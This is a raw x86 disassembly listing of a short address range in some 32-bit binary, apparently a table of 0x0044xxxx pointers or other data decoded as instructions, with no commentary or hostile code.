  443e89:	jne    0x443e8d
  443e8b:	add    BYTE PTR [eax],al
  443e8d:	jne    0x443e91
  443e8f:	add    BYTE PTR [eax],al
  443e91:	jne    0x443e95
  443e93:	add    BYTE PTR [eax],al
  443e95:	jne    0x443e99
  443e97:	add    BYTE PTR [eax],al
  443e99:	jne    0x443e9d
  443e9b:	add    BYTE PTR [eax],al
  443e9d:	jne    0x443ea1
  443e9f:	add    BYTE PTR [eax],al
  443ea1:	jne    0x443ea5
  443ea3:	add    BYTE PTR [eax],al
  443ea5:	jne    0x443ea9
  443ea7:	add    BYTE PTR [eax],al
  443ea9:	jne    0x443ead
  443eab:	add    BYTE PTR [eax],al
  443ead:	jne    0x443eb1
  443eaf:	add    BYTE PTR [eax],al
  443eb1:	jne    0x443eb5
  443eb3:	add    BYTE PTR [eax],al
  443eb5:	jne    0x443eb9
  443eb7:	add    BYTE PTR [eax],al
  443eb9:	jne    0x443ebd
  443ebb:	add    BYTE PTR [eax],al
  443ebd:	jne    0x443ec1
  443ebf:	add    BYTE PTR [eax],al
  443ec1:	jne    0x443ec5
  443ec3:	add    BYTE PTR [eax],al
  443ec5:	jne    0x443ec9
  443ec7:	add    BYTE PTR [eax],al
  443ec9:	jne    0x443ecd
  443ecb:	add    BYTE PTR [eax],al
  443ecd:	jne    0x443ed1
  443ecf:	add    BYTE PTR [eax],al
  443ed1:	jne    0x443ed5
  443ed3:	add    BYTE PTR [eax],al
  443ed5:	jne    0x443ed9
  443ed7:	add    BYTE PTR [eax],al
  443ed9:	jne    0x443edd
  443edb:	add    BYTE PTR [eax],al
  443edd:	jne    0x443ee1
  443edf:	add    BYTE PTR [eax],al
  443ee1:	jne    0x443ee5
  443ee3:	add    BYTE PTR [eax],al
  443ee5:	add    BYTE PTR [eax],al
  443ee7:	add    BYTE PTR [eax],al
  443ee9:	add    BYTE PTR [ebp+0x2],dh
  443eec:	add    BYTE PTR [eax],al
  443eee:	jne    0x443ef2
  443ef0:	add    BYTE PTR [eax],al
  443ef2:	jne    0x443ef6
  443ef4:	add    BYTE PTR [eax],al
  443ef6:	jne    0x443efa
  443ef8:	add    BYTE PTR [eax],al
  443efa:	jne    0x443efe
  443efc:	add    BYTE PTR [eax],al
  443efe:	jne    0x443f02
  443f00:	add    BYTE PTR [eax],al
  443f02:	push   0x6c00447a
  443f07:	jp     0x443f4d
  443f09:	add    BYTE PTR [eax+0x7a],dh
  443f0c:	inc    esp
  443f0d:	add    BYTE PTR [edx+edi*2+0x44],dh
  443f11:	add    BYTE PTR [eax+0x7a],bh
  443f14:	inc    esp
  443f15:	add    BYTE PTR [edx+edi*2+0x44],bh
  443f19:	add    BYTE PTR [eax-0x7bffbb86],al
  443f1f:	jp     0x443f65
  443f21:	add    BYTE PTR [eax-0x73ffbb86],cl
  443f27:	jp     0x443f6d
  443f29:	add    BYTE PTR [eax-0x6bffbb86],dl
  443f2f:	jp     0x443f75
  443f31:	add    BYTE PTR [eax-0x63ffbb86],bl
  443f37:	jp     0x443f7d
  443f39:	add    BYTE PTR [eax-0x5bffbb86],ah
  443f3f:	jp     0x443f85
  443f41:	add    BYTE PTR [eax-0x53ffbb86],ch
  443f47:	jp     0x443f8d
  443f49:	add    BYTE PTR [eax-0x4bffbb86],dh
  443f4f:	jp     0x443f95
  443f51:	add    BYTE PTR [eax-0x43ffbb86],bh
  443f57:	jp     0x443f9d
  443f59:	add    al,al
  443f5b:	jp     0x443fa1
  443f5d:	add    ah,al
  443f5f:	jp     0x443fa5
  443f61:	add    al,cl
  443f63:	jp     0x443fa9
  443f65:	add    ah,cl
  443f67:	jp     0x443fad
  443f69:	add    al,dl
  443f6b:	jp     0x443fb1
  443f6d:	add    ah,dl
  443f6f:	jp     0x443fb5
  443f71:	add    al,bl
  443f73:	jp     0x443fb9
  443f75:	add    ah,bl
  443f77:	jp     0x443fbd
  443f79:	add    al,ah
  443f7b:	jp     0x443fc1
  443f7d:	add    ah,ah
  443f7f:	jp     0x443fc5
  443f81:	add    al,ch
  443f83:	jp     0x443fc9
  443f85:	add    ah,ch
  443f87:	jp     0x443fcd
  443f89:	add    al,dh
  443f8b:	jp     0x443fd1
  443f8d:	add    ah,dh
  443f8f:	jp     0x443fd5
  443f91:	add    al,bh
  443f93:	jp     0x443fd9
  443f95:	add    ah,bh
  443f97:	jp     0x443fdd
  443f99:	add    BYTE PTR [eax],al
  443f9b:	jnp    0x443fe1
  443f9d:	add    BYTE PTR [eax+0x7a],ch
  443fa0:	inc    esp
  443fa1:	add    BYTE PTR [ebx+edi*2],al
  443fa4:	inc    esp
  443fa5:	add    BYTE PTR [eax],cl
  443fa7:	jnp    0x443fed
  443fa9:	add    BYTE PTR [ebx+edi*2],cl
  443fac:	inc    esp
  443fad:	add    BYTE PTR [eax],dl
  443faf:	jnp    0x443ff5
  443fb1:	add    BYTE PTR [ebx+edi*2],dl
  443fb4:	inc    esp
  443fb5:	add    BYTE PTR [eax],bl
  443fb7:	jnp    0x443ffd
  443fb9:	add    BYTE PTR [ebx+edi*2],bl
  443fbc:	inc    esp
  443fbd:	add    BYTE PTR [eax],ah
  443fbf:	jnp    0x444005
  443fc1:	add    BYTE PTR [ebx+edi*2],ah
  443fc4:	inc    esp
  443fc5:	add    BYTE PTR [eax],ch
  443fc7:	jnp    0x44400d
  443fc9:	add    BYTE PTR [ebx+edi*2],ch
  443fcc:	inc    esp
  443fcd:	add    BYTE PTR [eax],dh
  443fcf:	jnp    0x444015
  443fd1:	add    BYTE PTR [ebx+edi*2],dh
  443fd4:	inc    esp
  443fd5:	add    BYTE PTR [eax],bh
  443fd7:	jnp    0x44401d
  443fd9:	add    BYTE PTR [ebx+edi*2],bh
  443fdc:	inc    esp
  443fdd:	add    BYTE PTR [eax+0x7b],al
  443fe0:	inc    esp
  443fe1:	add    BYTE PTR [ebx+edi*2+0x44],al
  443fe5:	add    BYTE PTR [eax+0x7b],cl
  443fe8:	inc    esp
  443fe9:	add    BYTE PTR [ebx+edi*2+0x44],cl
  443fed:	add    BYTE PTR [eax+0x7b],dl
  443ff0:	inc    esp
  443ff1:	add    BYTE PTR [ebx+edi*2+0x44],dl
  443ff5:	add    BYTE PTR [eax+0x7b],bl
  443ff8:	inc    esp
  443ff9:	add    BYTE PTR [ebx+edi*2+0x44],bl
  443ffd:	add    BYTE PTR [eax+0x7b],ah
  444000:	inc    esp
  444001:	add    BYTE PTR [ebx+edi*2+0x44],ah
  444005:	add    BYTE PTR [eax+0x7b],ch
  444008:	inc    esp
  444009:	add    BYTE PTR [ebx+edi*2+0x44],ch
  44400d:	add    BYTE PTR [eax+0x7b],dh
  444010:	inc    esp
  444011:	add    BYTE PTR [ebx+edi*2+0x44],dh
  444015:	add    BYTE PTR [eax+0x7b],bh
  444018:	inc    esp
  444019:	add    BYTE PTR [ebx+edi*2+0x44],bh
  44401d:	add    BYTE PTR [eax-0x7bffbb85],al
  444023:	jnp    0x444069
  444025:	add    BYTE PTR [eax-0x73ffbb85],cl
  44402b:	jnp    0x444071
  44402d:	add    BYTE PTR [eax-0x6bffbb85],dl
  444033:	jnp    0x444079
  444035:	add    BYTE PTR [eax-0x63ffbb85],bl
  44403b:	jnp    0x444081
  44403d:	add    BYTE PTR [eax-0x5bffbb85],ah
  444043:	jnp    0x444089
  444045:	add    BYTE PTR [eax-0x53ffbb85],ch
  44404b:	jnp    0x444091
  44404d:	add    BYTE PTR [eax-0x4fffbb85],dl
  444053:	jnp    0x444099
  444055:	add    BYTE PTR [ebx+edi*2+0x7b580044],dh
  44405c:	inc    esp
  44405d:	add    BYTE PTR [eax-0x43ffbb85],bh
  444063:	jnp    0x4440a9
  444065:	add    al,al
  444067:	jnp    0x4440ad
  444069:	add    al,ch
  44406b:	jp     0x4440b1
  44406d:	add    ah,al
  44406f:	jnp    0x4440b5
  444071:	add    BYTE PTR [ebx+edi*2+0x44],dl
  444075:	add    al,cl
  444077:	jnp    0x4440bd
  444079:	add    ah,cl
  44407b:	jnp    0x4440c1
  44407d:	add    al,ch
  44407f:	jp     0x4440c5
  444081:	add    al,dl
  444083:	jnp    0x4440c9
  444085:	add    ah,dl
  444087:	jnp    0x4440cd
  444089:	add    BYTE PTR [eax-0x27ffbb85],bl
  44408f:	jnp    0x4440d5
  444091:	add    ah,bl
  444093:	jnp    0x4440d9
  444095:	add    ah,bl
  444097:	jnp    0x4440dd
  444099:	add    al,ah
  44409b:	jnp    0x4440e1
  44409d:	add    ah,ah
  44409f:	jnp    0x4440e5
  4440a1:	add    al,ch
  4440a3:	jnp    0x4440e9
  4440a5:	add    ah,ch
  4440a7:	jnp    0x4440ed
  4440a9:	add    al,dh
  4440ab:	jnp    0x4440f1
  4440ad:	add    al,cl
  4440af:	jp     0x4440f5
  4440b1:	add    ah,dh
  4440b3:	jnp    0x4440f9
  4440b5:	add    al,bh
  4440b7:	jnp    0x4440fd
  4440b9:	add    ah,bh
  4440bb:	jnp    0x444101
  4440bd:	add    BYTE PTR [eax],al
  4440bf:	jl     0x444105
  4440c1:	add    BYTE PTR [esp+edi*2],al
  4440c4:	inc    esp
  4440c5:	add    BYTE PTR [eax],cl
  4440c7:	jl     0x44410d
  4440c9:	add    BYTE PTR [esp+edi*2],cl
  4440cc:	inc    esp
  4440cd:	add    BYTE PTR [eax],dl
  4440cf:	jl     0x444115
  4440d1:	add    BYTE PTR [esp+edi*2],dl
  4440d4:	inc    esp
  4440d5:	add    BYTE PTR [edx+edi*2+0x7c180044],bh
  4440dc:	inc    esp
  4440dd:	add    ah,bl
  4440df:	jp     0x444125
  4440e1:	add    BYTE PTR [esp+edi*2],bl
  4440e4:	inc    esp
  4440e5:	add    BYTE PTR [eax],ah
  4440e7:	jl     0x44412d
  4440e9:	add    BYTE PTR [eax+0x2400447a],ah
  4440ef:	jl     0x444135
  4440f1:	add    BYTE PTR [eax],ch
  4440f3:	jl     0x444139
  4440f5:	add    BYTE PTR [esp+edi*2],ch
  4440f8:	inc    esp
  4440f9:	add    BYTE PTR [eax],dh
  4440fb:	jl     0x444141
  4440fd:	add    BYTE PTR [esp+edi*2],dh
  444100:	inc    esp
  444101:	add    BYTE PTR [eax],bh
  444103:	jl     0x444149
  444105:	add    BYTE PTR [esp+edi*2],bh
  444108:	inc    esp
  444109:	add    BYTE PTR [eax+0x7c],al
  44410c:	inc    esp
  44410d:	add    BYTE PTR [esp+edi*2+0x44],al
  444111:	add    BYTE PTR [eax+0x7c],cl
  444114:	inc    esp
  444115:	add    BYTE PTR [esp+edi*2+0x44],cl
  444119:	add    BYTE PTR [eax+0x7c],dl
  44411c:	inc    esp
  44411d:	add    BYTE PTR [edx+edi*2+0x44],bh
  444121:	add    BYTE PTR [esp+edi*2+0x44],dl
  444125:	add    BYTE PTR [eax+0x7c],bl
  444128:	inc    esp
  444129:	add    BYTE PTR [esp+edi*2+0x44],bl
  44412d:	add    BYTE PTR [eax+0x7c],ah
  444130:	inc    esp
  444131:	add    BYTE PTR [esp+edi*2+0x44],ah
  444135:	add    BYTE PTR [eax+0x6800447b],bh
  44413b:	jl     0x444181
  44413d:	add    BYTE PTR [esp+edi*2+0x44],ch
  444141:	add    BYTE PTR [eax+0x7c],dh
  444144:	inc    esp
  444145:	add    BYTE PTR [esp+edi*2+0x44],dh
  444149:	add    BYTE PTR [eax+0x7c],bh
  44414c:	inc    esp
  44414d:	add    BYTE PTR [esp+edi*2+0x44],bh
  444151:	add    BYTE PTR [eax-0x67ffbb84],al
  444157:	jp     0x44419d
  444159:	add    BYTE PTR [esp+edi*2+0x7c880044],al
  444160:	inc    esp
  444161:	add    BYTE PTR [eax+0x7c],dl
  444164:	inc    esp
  444165:	add    BYTE PTR [eax-0x73ffbb85],cl
  44416b:	jl     0x4441b1
  44416d:	add    BYTE PTR [eax-0x6bffbb84],dl
  444173:	jl     0x4441b9
  444175:	add    BYTE PTR [eax-0x63ffbb84],bl
  44417b:	jl     0x4441c1
  44417d:	add    BYTE PTR [eax-0x5bffbb84],ah
  444183:	jl     0x4441c9
  444185:	add    BYTE PTR [eax-0x4fffbb84],ch
  44418b:	add    BYTE PTR [eax+eax*1-0x4c],0x80
  444190:	inc    esp
  444191:	add    BYTE PTR [eax-0x43ffbb80],bh
  444197:	add    BYTE PTR [eax+eax*1-0x40],0x80
  44419c:	inc    esp
  44419d:	add    ah,al
  44419f:	add    BYTE PTR [eax+eax*1-0x38],0x80
  4441a4:	inc    esp
  4441a5:	add    ah,cl
  4441a7:	add    BYTE PTR [eax+eax*1-0x30],0x80
  4441ac:	inc    esp
  4441ad:	add    ah,dl
  4441af:	add    BYTE PTR [eax+eax*1-0x34],0x80
  4441b4:	inc    esp
  4441b5:	add    al,bl
  4441b7:	add    BYTE PTR [eax+eax*1-0x24],0x80
  4441bc:	inc    esp
  4441bd:	add    al,ah
  4441bf:	add    BYTE PTR [eax+eax*1-0x38],0x80
  4441c4:	inc    esp
  4441c5:	add    ah,ah
  4441c7:	add    BYTE PTR [eax+eax*1-0x18],0x80
  4441cc:	inc    esp
  4441cd:	add    ah,ch
  4441cf:	add    BYTE PTR [eax+eax*1-0x10],0x80
  4441d4:	inc    esp
  4441d5:	add    ah,dh
  4441d7:	add    BYTE PTR [eax+eax*1-0x8],0x80
  4441dc:	inc    esp
  4441dd:	add    ah,bh
  4441df:	add    BYTE PTR [eax+eax*1+0x0],0x81
  4441e4:	inc    esp
  4441e5:	add    BYTE PTR [ecx+eax*4],al
  4441e8:	inc    esp
  4441e9:	add    BYTE PTR [eax],cl
  4441eb:	add    DWORD PTR [eax+eax*1+0xc],0x10004481
  4441f3:	add    DWORD PTR [eax+eax*1+0x14],0x18004481
  4441fb:	add    DWORD PTR [eax+eax*1+0x1c],0x20004481
  444203:	add    DWORD PTR [eax+eax*1+0x24],0x28004481
  44420b:	add    DWORD PTR [eax+eax*1+0x2c],0x30004481
  444213:	add    DWORD PTR [eax+eax*1+0x34],0x38004481
  44421b:	add    DWORD PTR [eax+eax*1+0x3c],0x40004481
  444223:	add    DWORD PTR [eax+eax*1+0x44],0x48004481
  44422b:	add    DWORD PTR [eax+eax*1+0x4c],0x50004481
  444233:	add    DWORD PTR [eax+eax*1+0x54],0x58004481
  44423b:	add    DWORD PTR [eax+eax*1+0x5c],0x60004481
  444243:	add    DWORD PTR [eax+eax*1+0x64],0x68004481
  44424b:	add    DWORD PTR [eax+eax*1+0x6c],0x70004481
  444253:	add    DWORD PTR [eax+eax*1+0x74],0x78004481
  44425b:	add    DWORD PTR [eax+eax*1+0x7c],0x80004481
  444263:	add    DWORD PTR [eax+eax*1-0x7c],0x80004481
  44426b:	add    DWORD PTR [eax+eax*1-0x78],0x8c004481
  444273:	add    DWORD PTR [eax+eax*1-0x70],0x94004481
  44427b:	add    DWORD PTR [eax+eax*1-0x68],0x4004481
  444283:	add    DWORD PTR [eax+eax*1-0x64],0xa0004481
  44428b:	add    DWORD PTR [eax+eax*1-0x5c],0xa8004481
  444293:	add    DWORD PTR [eax+eax*1-0x50],0xac004480
  44429b:	add    DWORD PTR [eax+eax*1+0x54],0xb8004481
  4442a3:	add    BYTE PTR [eax+eax*1-0x50],0x81
  4442a8:	inc    esp
  4442a9:	add    BYTE PTR [ecx+eax*4-0x7e47ffbc],dh
  4442b0:	inc    esp
  4442b1:	add    BYTE PTR [ecx+eax*4-0x7e3fffbc],bh
  4442b8:	inc    esp
  4442b9:	add    ah,al
  4442bb:	add    DWORD PTR [eax+eax*1+0x3c],0xc8004481
  4442c3:	add    DWORD PTR [eax+eax*1-0x34],0xd0004481
  4442cb:	add    DWORD PTR [eax+eax*1-0x50],0xd4004481
  4442d3:	add    DWORD PTR [eax+eax*1-0x28],0xac004481
  4442db:	add    DWORD PTR [eax+eax*1+0x28],0xa0004481
  4442e3:	add    DWORD PTR [eax+eax*1-0x24],0xe0004481
  4442eb:	add    DWORD PTR [eax+eax*1-0x1c],0xe8004481
  4442f3:	add    DWORD PTR [eax+eax*1-0x14],0xf0004481
  4442fb:	add    DWORD PTR [eax+eax*1-0xc],0xf8004481
  444303:	add    DWORD PTR [eax+eax*1-0x4],0x4481
  44430b:	add    BYTE PTR [eax+eax*1-0x48],0x80
  444310:	inc    esp
  444311:	add    BYTE PTR [ecx+eax*4-0x7e37ffbc],dh
  444318:	inc    esp
  444319:	add    BYTE PTR [edx+eax*4],al
  44431c:	inc    esp
  44431d:	add    BYTE PTR [eax],cl
  44431f:	add    BYTE PTR [eax+eax*1+0xc],0x82
  444324:	inc    esp
  444325:	add    BYTE PTR [eax],dl
  444327:	add    BYTE PTR [eax+eax*1+0x14],0x82
  44432c:	inc    esp
  44432d:	add    BYTE PTR [eax],bl
  44432f:	add    BYTE PTR [eax+eax*1+0x34],0x81
  444334:	inc    esp
  444335:	add    BYTE PTR [edx+eax*4],bl
  444338:	inc    esp
  444339:	add    BYTE PTR [eax],ah
  44433b:	add    BYTE PTR [eax+eax*1+0x24],0x82
  444340:	inc    esp
  444341:	add    BYTE PTR [eax],ch
  444343:	add    BYTE PTR [eax+eax*1+0x2c],0x82
  444348:	inc    esp
  444349:	add    BYTE PTR [eax],dh
  44434b:	add    BYTE PTR [eax+eax*1+0x34],0x82
  444350:	inc    esp
  444351:	add    ah,cl
  444353:	add    BYTE PTR [eax+eax*1-0x14],0x80
  444358:	inc    esp
  444359:	add    al,ch
  44435b:	add    DWORD PTR [eax+eax*1+0x38],0x3c004482
  444363:	add    BYTE PTR [eax+eax*1+0x40],0x82
  444368:	inc    esp
  444369:	add    BYTE PTR [edx+eax*4],al
  44436c:	inc    esp
  44436d:	add    BYTE PTR [edx+eax*4+0x44],al
  444371:	add    BYTE PTR [eax-0x7e],cl
  444374:	inc    esp
  444375:	add    BYTE PTR [edx+eax*4+0x44],cl
  444379:	add    ah,ah
  44437b:	add    DWORD PTR [eax+eax*1+0x50],0x54004482
  444383:	add    BYTE PTR [eax+eax*1+0x58],0x82
  444388:	inc    esp
  444389:	add    BYTE PTR [edx+eax*4+0x44],bl
  44438d:	add    BYTE PTR [eax-0x7e],ah
  444390:	inc    esp
  444391:	add    ah,ah
  444393:	add    BYTE PTR [eax+eax*1+0x64],0x82
  444398:	inc    esp
  444399:	add    BYTE PTR [eax+0x4004480],bh
  44439f:	add    DWORD PTR [eax+eax*1+0x68],0xcc004482
  4443a7:	add    DWORD PTR [eax+eax*1-0x50],0xf4004480
  4443af:	add    DWORD PTR [eax+eax*1+0x3c],0x6c004481
  4443b7:	add    BYTE PTR [eax+eax*1+0x70],0x82
  4443bc:	inc    esp
  4443bd:	add    BYTE PTR [edx+eax*4+0x44],dh
  4443c1:	add    BYTE PTR [eax-0x7f],dh
  4443c4:	inc    esp
  4443c5:	add    BYTE PTR [eax],ah
  4443c7:	add    BYTE PTR [eax+eax*1+0x78],0x82
  4443cc:	inc    esp
  4443cd:	add    BYTE PTR [edx+eax*4+0x44],bh
  4443d1:	add    BYTE PTR [eax+0x28004482],al
  4443d7:	add    BYTE PTR [eax+eax*1-0x7c],0x82
  4443dc:	inc    esp
  4443dd:	add    BYTE PTR [eax+0x18004481],dh
  4443e3:	add    DWORD PTR [eax+eax*1-0x3c],0x88004480
  4443eb:	add    BYTE PTR [eax+eax*1-0x74],0x82
  4443f0:	inc    esp
  4443f1:	add    BYTE PTR [eax-0x6bffbb7e],dl
  4443f7:	add    BYTE PTR [eax+eax*1-0x68],0x82
  4443fc:	inc    esp
  4443fd:	add    BYTE PTR [edx+eax*4-0x7d5fffbc],bl
  444404:	inc    esp
  444405:	add    BYTE PTR [edx+eax*4+0x44],cl
  444409:	add    BYTE PTR [ecx+eax*4],ch
  44440c:	inc    esp
  44440d:	add    BYTE PTR [edx+eax*4-0x7d57ffbc],ah
  444414:	inc    esp
  444415:	add    ah,cl
  444417:	add    BYTE PTR [eax+eax*1-0x7c],0x82
  44441c:	inc    esp
  44441d:	add    BYTE PTR [edx+eax*4-0x7d4fffbc],ch
  444424:	inc    esp
  444425:	add    ah,bl
  444427:	add    BYTE PTR [eax+eax*1-0x4c],0x82
  44442c:	inc    esp
  44442d:	add    BYTE PTR [eax-0x4fffbb7f],ch
  444433:	add    DWORD PTR [eax+eax*1-0x48],0x20004482
  44443b:	add    BYTE PTR [eax+eax*1-0x40],0x81
  444440:	inc    esp
  444441:	add    ah,ch
  444443:	add    DWORD PTR [eax+eax*1+0x18],0x74004481
  44444b:	add    BYTE PTR [eax+eax*1+0x74],0x81
  444450:	inc    esp
  444451:	add    BYTE PTR [edx+eax*4-0x7d87ffbc],bh
  444458:	inc    esp
  444459:	add    al,al
  44445b:	add    BYTE PTR [eax+eax*1-0x3c],0x82
  444460:	inc    esp
  444461:	add    BYTE PTR [eax-0x37ffbb7f],al
  444467:	add    BYTE PTR [eax+eax*1-0x44],0x82
  44446c:	inc    esp
  44446d:	add    al,al
  44446f:	add    DWORD PTR [eax+eax*1-0x34],0xd0004482
  444477:	add    BYTE PTR [eax+eax*1-0x2c],0x82
  44447c:	inc    esp
  44447d:	add    BYTE PTR [edx+eax*4+0x44],bl
  444481:	add    al,bl
  444483:	add    BYTE PTR [eax+eax*1-0x30],0x82
  444488:	inc    esp
  444489:	add    BYTE PTR [eax],dh
  44448b:	add    BYTE PTR [eax+eax*1+0x58],0x82
  444490:	inc    esp
  444491:	add    ah,bl
  444493:	add    BYTE PTR [eax+eax*1-0x20],0x82
  444498:	inc    esp
  444499:	add    BYTE PTR [eax-0x1bffbb7f],dl
  44449f:	add    BYTE PTR [eax+eax*1-0x18],0x82
  4444a4:	inc    esp
  4444a5:	add    ah,ch
  4444a7:	add    BYTE PTR [eax+eax*1-0x10],0x82
  4444ac:	inc    esp
  4444ad:	add    ah,dh
  4444af:	add    BYTE PTR [eax+eax*1-0x70],0x82
  4444b4:	inc    esp
  4444b5:	add    BYTE PTR [eax-0x7ffbb7f],bh
  4444bb:	add    BYTE PTR [eax+eax*1-0x4],0x82
  4444c0:	inc    esp
  4444c1:	add    BYTE PTR [eax],al
  4444c3:	add    DWORD PTR [eax+eax*1+0x4],0xffffff83
  4444c8:	inc    esp
  4444c9:	add    BYTE PTR [eax],cl
  4444cb:	add    DWORD PTR [eax+eax*1-0x78],0xffffff81
  4444d0:	inc    esp
  4444d1:	add    BYTE PTR [eax],ch
  4444d3:	add    BYTE PTR [eax+eax*1+0x68],0x82
  4444d8:	inc    esp
  4444d9:	add    BYTE PTR [edx+eax*4+0x44],bh
  4444dd:	add    ah,ah
  4444df:	add    BYTE PTR [eax+eax*1+0x60],0x82
  4444e4:	inc    esp
  4444e5:	add    BYTE PTR [ebx+eax*4],cl
  4444e8:	inc    esp
  4444e9:	add    BYTE PTR [eax],dl
  4444eb:	add    DWORD PTR [eax+eax*1+0x14],0xffffff83
  4444f0:	inc    esp
  4444f1:	add    BYTE PTR [eax],ch
  4444f3:	add    DWORD PTR [eax+eax*1+0x2c],0x18004482
  4444fb:	add    DWORD PTR [eax+eax*1+0x70],0xffffff81
  444500:	inc    esp
  444501:	add    BYTE PTR [ecx+eax*4-0x7f47ffbc],al
  444508:	inc    esp
  444509:	add    BYTE PTR [ebx+eax*4],bl
  44450c:	inc    esp
  44450d:	add    al,dh
  44450f:	add    BYTE PTR [eax+eax*1+0x20],0x83
  444514:	inc    esp
  444515:	add    BYTE PTR [ebx+eax*4],ah
  444518:	inc    esp
  444519:	add    BYTE PTR [eax],ch
  44451b:	add    DWORD PTR [eax+eax*1+0x64],0xffffff82
  444520:	inc    esp
  444521:	add    BYTE PTR [ebx+eax*4],ch
  444524:	inc    esp
  444525:	add    BYTE PTR [eax],dh
  444527:	add    DWORD PTR [eax+eax*1+0x34],0xffffff83
  44452c:	inc    esp
  44452d:	add    BYTE PTR [eax],bh
  44452f:	add    DWORD PTR [eax+eax*1+0x68],0xffffff81
  444534:	inc    esp
  444535:	add    BYTE PTR [ebx+eax*4],ch
  444538:	inc    esp
  444539:	add    BYTE PTR [ebx+eax*4],bh
  44453c:	inc    esp
  44453d:	add    BYTE PTR [eax-0x7d],al
  444540:	inc    esp
  444541:	add    BYTE PTR [ebx+eax*4],ch
  444544:	inc    esp
  444545:	add    BYTE PTR [ecx+eax*4+0x44],ah
  444549:	add    BYTE PTR [edx+eax*4],dl
  44454c:	inc    esp
  44454d:	add    BYTE PTR [edx+eax*4-0x7e7bffbc],bl
  444554:	inc    esp
  444555:	add    BYTE PTR [edx+eax*4-0x7cbbffbc],ah
  44455c:	inc    esp
  44455d:	add    BYTE PTR [eax-0x7d],cl
  444560:	inc    esp
  444561:	add    BYTE PTR [ecx+eax*4+0x44],al
  444565:	add    BYTE PTR [eax+0x4c004482],al
  44456b:	add    DWORD PTR [eax+eax*1-0xc],0xffffff80
  444570:	inc    esp
  444571:	add    BYTE PTR [ecx+eax*4],bh
  444574:	inc    esp
  444575:	add    BYTE PTR [eax-0x7e],bl
  444578:	inc    esp
  444579:	add    BYTE PTR [eax-0x7d],dl
  44457c:	inc    esp
  44457d:	add    BYTE PTR [ebx+eax*4+0x44],dl
  444581:	add    BYTE PTR [ecx+eax*4-0x7ca7ffbc],bl
  444588:	inc    esp
  444589:	add    ah,dl
  44458b:	add    BYTE PTR [eax+eax*1+0x40],0x81
  444590:	inc    esp
  444591:	add    BYTE PTR [ebx+eax*4+0x44],bl
  444595:	add    BYTE PTR [edx+eax*4],ch
  444598:	inc    esp
  444599:	add    BYTE PTR [eax-0x7d],ah
  44459c:	inc    esp
  44459d:	add    BYTE PTR [eax-0x7f],dl
  4445a0:	inc    esp
  4445a1:	add    BYTE PTR [ebx+eax*4+0x44],ah
  4445a5:	add    al,dl
  4445a7:	add    BYTE PTR [eax+eax*1+0x68],0x83
  4445ac:	inc    esp
  4445ad:	add    BYTE PTR [eax-0x7e],dh
  4445b0:	inc    esp
  4445b1:	add    BYTE PTR [ebx+eax*4+0x44],ch
  4445b5:	add    BYTE PTR [eax-0x7d],dh
  4445b8:	inc    esp
  4445b9:	add    BYTE PTR [eax-0x7f],ch
  4445bc:	inc    esp
  4445bd:	add    BYTE PTR [ecx+eax*4+0x44],bh
  4445c1:	add    al,dh
  4445c3:	add    BYTE PTR [eax+eax*1+0x4],0x83
  4445c8:	inc    esp
  4445c9:	add    BYTE PTR [ecx+eax*4+0x44],al
  4445cd:	add    BYTE PTR [ebx+eax*4+0x44],dh
  4445d1:	add    BYTE PTR [eax-0x7d],bh
  4445d4:	inc    esp
  4445d5:	add    BYTE PTR [eax],bl
  4445d7:	add    DWORD PTR [eax+eax*1-0x60],0xffffff82
  4445dc:	inc    esp
  4445dd:	add    BYTE PTR [eax],cl
  4445df:	add    BYTE PTR [eax+eax*1-0x5c],0x81
  4445e4:	inc    esp
  4445e5:	add    al,ch
  4445e7:	add    BYTE PTR [eax+eax*1+0x3c],0x82
  4445ec:	inc    esp
  4445ed:	add    BYTE PTR [ebx+eax*4+0x44],bh
  4445f1:	add    BYTE PTR [eax],ah
  4445f3:	add    DWORD PTR [eax+eax*1-0xc],0xffffff81
  4445f8:	inc    esp
  4445f9:	add    BYTE PTR [ebx+eax*4+0x44],ch
  4445fd:	add    BYTE PTR [eax+0x64004483],al
  444603:	add    BYTE PTR [eax+eax*1-0x1c],0x80
  444608:	inc    esp
  444609:	add    BYTE PTR [edx+eax*4],dl
  44460c:	inc    esp
  44460d:	add    BYTE PTR [ebx+eax*4-0x7c77ffbc],al
  444614:	inc    esp
  444615:	add    BYTE PTR [eax+0x44004481],bh
  44461b:	add    DWORD PTR [eax+eax*1-0x74],0xffffff83
  444620:	inc    esp
  444621:	add    BYTE PTR [eax+0x60004483],dl
  444627:	add    BYTE PTR [eax+eax*1-0x6c],0x83
  44462c:	inc    esp
  44462d:	add    BYTE PTR [eax-0x7fffbb7d],bl
  444633:	add    BYTE PTR [eax+eax*1+0x78],0x81
  444638:	inc    esp
  444639:	add    ah,al
  44463b:	jl     0x444681
  44463d:	add    al,cl
  44463f:	jl     0x444685
  444641:	add    ah,cl
  444643:	jl     0x444689
  444645:	add    al,dl
  444647:	jl     0x44468d
  444649:	add    ah,dl
  44464b:	jl     0x444691
  44464d:	add    al,bl
  44464f:	jl     0x444695
  444651:	add    ah,bl
  444653:	jl     0x444699
  444655:	add    al,ah
  444657:	jl     0x44469d
  444659:	add    ah,ah
  44465b:	jl     0x4446a1
  44465d:	add    al,ch
  44465f:	jl     0x4446a5
  444661:	add    ah,ch
  444663:	jl     0x4446a9
  444665:	add    al,dh
  444667:	jl     0x4446ad
  444669:	add    ah,dh
  44466b:	jl     0x4446b1
  44466d:	add    al,bh
  44466f:	jl     0x4446b5
  444671:	add    ah,bh
  444673:	jl     0x4446b9
  444675:	add    BYTE PTR [eax],al
  444677:	jge    0x4446bd
  444679:	add    BYTE PTR [edi*2+0x7d080044],al
  444680:	inc    esp
  444681:	add    BYTE PTR [edi*2+0x7d100044],cl
  444688:	inc    esp
  444689:	add    BYTE PTR [edi*2+0x7d180044],dl
  444690:	inc    esp
  444691:	add    BYTE PTR [edi*2+0x7d200044],bl
  444698:	inc    esp
  444699:	add    BYTE PTR [edi*2+0x7d280044],ah
  4446a0:	inc    esp
  4446a1:	add    BYTE PTR [edi*2+0x7d300044],ch
  4446a8:	inc    esp
  4446a9:	add    BYTE PTR [edi*2+0x7d380044],dh
  4446b0:	inc    esp
  4446b1:	add    BYTE PTR [edi*2+0x7d400044],bh
  4446b8:	inc    esp
  4446b9:	add    BYTE PTR [ebp+edi*2+0x44],al
  4446bd:	add    BYTE PTR [eax+0x7d],cl
  4446c0:	inc    esp
  4446c1:	add    BYTE PTR [ebp+edi*2+0x44],cl
  4446c5:	add    BYTE PTR [eax+0x7d],dl
  4446c8:	inc    esp
  4446c9:	add    BYTE PTR [ebp+edi*2+0x44],dl
